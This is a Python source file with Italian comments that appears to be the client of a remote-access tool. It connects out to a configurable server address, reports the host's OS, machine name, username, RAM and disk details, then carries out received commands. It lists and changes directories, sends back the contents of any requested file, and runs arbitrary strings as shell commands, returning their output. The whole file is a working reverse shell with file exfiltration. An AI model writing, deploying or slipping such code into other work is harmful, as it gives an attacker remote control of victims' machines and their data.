import getpass
import threading
from socket import *
import platform
import os
import psutil
import subprocess
import time

checkConnectionPort = 23000
# indirizzo IP a cui connettersi
serverName = 'localhost'
# usata solo per pairing iniziale, il S.O. assegna poi una porta
serverPort = 6677


def checkConnection():
    checkSocket = socket(AF_INET, SOCK_STREAM)
    checkSocket.connect((serverName, checkConnectionPort))
    checkSocket.settimeout(3)
    while True:
        try:
            checkSocket.recv(1).decode()
            checkSocket.send('0'.encode())
            time.sleep(2)
        except Exception as e:
            print(e)
            checkSocket.close()
            raise e


clientSocket = socket(AF_INET, SOCK_STREAM)
while True:
    try:
        clientSocket.connect((serverName, serverPort))
    except:
        print('Ops... connessione non trovata, attendere...\n')
        continue

    break
# dichiarato il thread che ha come target la funzione checkConnection e come argomento da passare connectionSocket
# threadCheckConnection = threading.Thread(target=checkConnection, args=())
# threadCheckConnection.start()
node = platform.node()
version = platform.version()
processor = platform.processor()
info = 'System: ' + platform.system()
info += '\nOS Version: ' + version
info += '\nMachine name: ' + node
info += '\nProcessor: ' + processor
info += '\nUser: ' + getpass.getuser()
info += '\nRAM: ' + str(int(psutil.virtual_memory().total / 1048576)) + 'MB'
info += '\nMain Disk Usage: ' + str(psutil.disk_usage('/').percent) + '% Full'
info += '\nDisk File System: ' + str(psutil.disk_partitions())

clientSocket.send(info.encode())
ack = clientSocket.recv(1024).decode()
command = clientSocket.recv(2048).decode()
while command != 'exit':
    print(command)
    if command == 'ls':
        path = os.getcwd()
        clientSocket.send(path.encode())
        clientSocket.send(str(os.listdir(path)).encode())
    elif command.startswith('1'):
        try:
            if command[1:] != '..':
                os.chdir(command[1:])
            else:
                os.chdir(os.path.normpath(os.getcwd() + os.sep + os.pardir))
            path = os.getcwd()
            clientSocket.send(path.encode())
        except OSError:
            path = "Directory inesistente."
            clientSocket.send(path.encode())
    elif command.startswith('0'):
        try:
            file = open(command[1:], "rb")
            data = file.read()
            clientSocket.send('1'.encode())
            clientSocket.send(data)
            file.close()
        except Exception as e:
            print(e)
            clientSocket.send('0'.encode())
    else:
        if platform.system() == 'Windows':
            # necessario per windows per far eseguire i comandi
            cmd = "cd C:\\Windows\\System32 && "
            proc = subprocess.Popen(cmd + command, stdout=subprocess.PIPE, shell=True)
            out, err = proc.communicate()
            if out == b'':
                notFound = "Command not found"
                clientSocket.send(notFound.encode())
                proc.kill()
            else:
                clientSocket.send(out)
                proc.kill()
        else:
            proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
            out, err = proc.communicate()
            if out == b'':
                notFound = "Command not found"
                clientSocket.send(notFound.encode())
                proc.kill()
            else:
                clientSocket.send(out)
                proc.kill()
    command = clientSocket.recv(2048).decode()

print("Connessione terminata")
clientSocket.close()
